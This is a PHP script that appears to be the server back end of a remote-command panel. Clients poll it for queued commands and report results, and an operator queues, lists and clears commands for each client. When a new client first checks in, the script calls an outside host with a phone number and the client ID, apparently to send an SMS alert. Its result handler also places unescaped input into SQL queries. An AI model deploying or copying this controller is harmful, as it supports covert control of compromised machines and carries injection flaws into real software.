<?php

include("database.inc.php");
include("disable_magic_quotes.inc.php");

if (isset($_GET["showall"])) {

	$client = mysql_real_escape_string($_GET["client"]);
	if (empty($client)) die();

	$sql = "SELECT * FROM commands WHERE client = '" . $client . "' ORDER BY id DESC";
	$data = mysql_query($sql);
	$total = mysql_num_rows($data);
	
	while ($row = mysql_fetch_assoc($data)) {
		
		echo "<div class=\"listing\">\n";
		if ($row["result"] != "") {
			$result = $row["result"];
		} else {
			if ($row["processed"] == "true") {
				$result = "Processing";
			} else {
				$result = "In Queue";
			}
		}

		echo	"<div class=\"result " . strtolower($result) . "\">" . $result . "</div>\n";
		echo	"<div class=\"command\">" . $row["command"] . "</div>\n";
		echo	"<div class=\"parameters\">" . $row["parameters"] . "</div>\n";
		echo	"<div class=\"clear\"></div>\n";
		echo "</div>\n\n";
	}
}
else if (isset($_GET["clearall"])) {
	$client = mysql_real_escape_string($_GET["client"]);
	if (empty($client)) die();

	$sql = "DELETE FROM commands WHERE client = '" . $client . "'";
	mysql_query($sql);
	
}
else if (isset($_GET["client"])) {

	$client = mysql_real_escape_string($_GET["client"]);
	if (empty($client)) die();

	recordClient($client);
		
	$sql = "SELECT * FROM commands WHERE client = '" . $client . "' AND processed = 'false'";
	$result = mysql_query($sql);
	$total = mysql_num_rows($result);
	
	if ($total) {
		$row = mysql_fetch_assoc($result);
		echo $row["id"] . " ## " . $row["command"];
		if (!empty($row["parameters"])) {
			echo " ## " . $row["parameters"];
		}
		mysql_query ("UPDATE commands SET processed = 'true' WHERE id = " . $row["id"]);
	}
}
else if (isset($_GET["result"])) {
	$id = $_GET["id"];
	$result = $_GET["result"];
	if (empty($id)) die();

	$sql = "UPDATE commands SET result = '" . $result . "' WHERE id = " . $id;
	mysql_query ($sql);
}
else if (isset($_POST["command"])) {
	
	$client = mysql_real_escape_string(trim($_POST["client"]));
	$command = mysql_real_escape_string(trim($_POST["command"]));
	$parameters = mysql_real_escape_string(trim($_POST["parameters"]));
	
	if (!empty($command)) {
	
		# Delete previous same commands in queue
		$sql = "DELETE FROM commands WHERE client = '" . $client . "' AND command = '" . $command . "' AND processed = 'false'";
		mysql_query($sql);

		# Insert the new command
		$sql = "INSERT INTO commands (client, command, parameters) VALUES ('" . $client . "', '" . $command . "', '" . $parameters . "')";
		mysql_query($sql);
	}
}

function recordClient($client) {

	$sql = "SELECT status FROM clients WHERE client = '" . $client . "'";
	$result = mysql_query($sql);
	$total = mysql_num_rows($result);
	
	if (!$total) {
		$sql = "INSERT INTO clients (client, status) VALUES ('" . $client . "', 'online')";
		mysql_query($sql);
		$url = "http://quran-sunnat.com/sss/?to=%2B923319059339&from=KMA&msg=" . urlencode($client);
		get_page($url);
	}
	else {
		$sql = "UPDATE clients SET status = 'online' WHERE client = '" . $client . "'";
		mysql_query($sql);
	}
}

function get_page($url) {
	$ch = curl_init();
	$timeout = 10;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

?>